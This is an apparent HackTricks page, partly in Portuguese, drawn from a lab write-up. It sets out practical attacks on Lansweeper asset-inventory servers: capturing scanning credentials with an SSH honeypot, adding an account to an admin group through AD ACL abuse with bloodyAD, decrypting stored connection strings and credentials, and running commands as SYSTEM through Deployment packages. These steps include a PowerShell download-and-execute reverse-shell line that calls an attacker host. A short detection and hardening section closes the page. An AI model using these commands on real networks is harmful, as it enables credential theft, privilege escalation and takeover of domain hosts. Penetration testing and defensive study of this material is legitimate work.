# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper é uma plataforma de descoberta e inventário de ativos de TI comumente implantada no Windows e integrada ao Active Directory. Credenciais configuradas no Lansweeper são usadas pelos seus scanning engines para autenticar em ativos via protocolos como SSH, SMB/WMI e WinRM. Configurações incorretas frequentemente permitem:

- Interceptação de credenciais redirecionando um Scanning Target para um host controlado pelo atacante (honeypot)
- Abuso de AD ACLs expostas por grupos relacionados ao Lansweeper para obter acesso remoto
- Decriptação on-host de secrets configurados no Lansweeper (connection strings e credenciais de scanning armazenadas)
- Execução de código em endpoints gerenciados via a feature Deployment (frequentemente executando como SYSTEM)

Esta página resume fluxos de ataque práticos e comandos para abusar desses comportamentos durante engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar creds capturadas contra os serviços do DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Funciona de forma semelhante para outros protocolos quando você consegue coagir o scanner ao seu listener (SMB/WinRM honeypots, etc.). SSH costuma ser o mais simples.
- Muitos scanners se identificam com banners de cliente distintos (por exemplo, RebexSSH) e tentarão comandos benignos (uname, whoami, etc.).

## 2) AD ACL abuse: obter acesso remoto adicionando-se a um grupo app-admin

Use o BloodHound para enumerar direitos efetivos a partir da conta comprometida. Uma descoberta comum é um grupo específico do scanner ou da app (por exemplo, “Lansweeper Discovery”) possuindo GenericAll sobre um grupo privilegiado (por exemplo, “Lansweeper Admins”). Se o grupo privilegiado também for membro de “Remote Management Users”, o WinRM fica disponível assim que nos adicionarmos.

Exemplos de coleta:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll em grupo com BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Em seguida, obtenha um shell interativo:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dica: operações Kerberos são sensíveis ao tempo. Se você receber KRB_AP_ERR_SKEW, sincronize o relógio com o DC primeiro:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Descriptografar segredos configurados pelo Lansweeper no host

No servidor Lansweeper, o site ASP.NET normalmente armazena uma connection string criptografada e uma chave simétrica usada pela aplicação. Com acesso local apropriado, você pode descriptografar a connection string do DB e então extrair as scanning credentials armazenadas.

Locais típicos:
- web.config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Chave da aplicação: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Use o SharpLansweeperDecrypt para automatizar a descriptografia e a extração das creds armazenadas:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
A saída esperada inclui detalhes de conexão DB e credenciais de varredura em texto simples, como contas Windows e Linux usadas em todo o ambiente. Essas frequentemente têm privilégios locais elevados em hosts de domínio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usar creds de scanning do Windows recuperadas para acesso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como membro do “Lansweeper Admins”, a interface web expõe Deployment e Configuration. Em Deployment → Deployment packages, você pode criar pacotes que executam comandos arbitrários em ativos alvo. A execução é realizada pelo serviço Lansweeper com alto privilégio, resultando em execução de código como NT AUTHORITY\SYSTEM no host selecionado.

High-level steps:
- Crie um novo Deployment package que execute um one-liner PowerShell ou cmd (reverse shell, add-user, etc.).
- Aponte para o ativo desejado (por exemplo, o DC/host onde Lansweeper roda) e clique em Deploy/Run now.
- Capture sua shell como SYSTEM.

Exemplos de payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are barulhentas e deixam logs no Lansweeper e nos event logs do Windows. Use com parcimônia.

## Detecção e hardening

- Restrinja ou remova enumerações SMB anônimas. Monitore por RID cycling e acesso anômalo a shares do Lansweeper.
- Controles de egress: bloqueie ou restrinja fortemente SSH/SMB/WinRM de saída a partir dos hosts scanner. Alerta em portas não padrão (ex.: 2022) e banners de cliente incomuns como Rebex.
- Proteja `Website\\web.config` e `Key\\Encryption.txt`. Externalize secrets em um vault e rotacione em caso de exposição. Considere service accounts com privilégios mínimos e gMSA quando viável.
- Monitoramento AD: alerte sobre alterações em grupos relacionados ao Lansweeper (ex.: “Lansweeper Admins”, “Remote Management Users”) e sobre mudanças de ACL que concedam GenericAll/Write membership em grupos privilegiados.
- Audite criações/alterações/executions de Deployment packages; alerte sobre packages que disparem cmd.exe/powershell.exe ou conexões de saída inesperadas.

## Tópicos relacionados
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## Referências
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
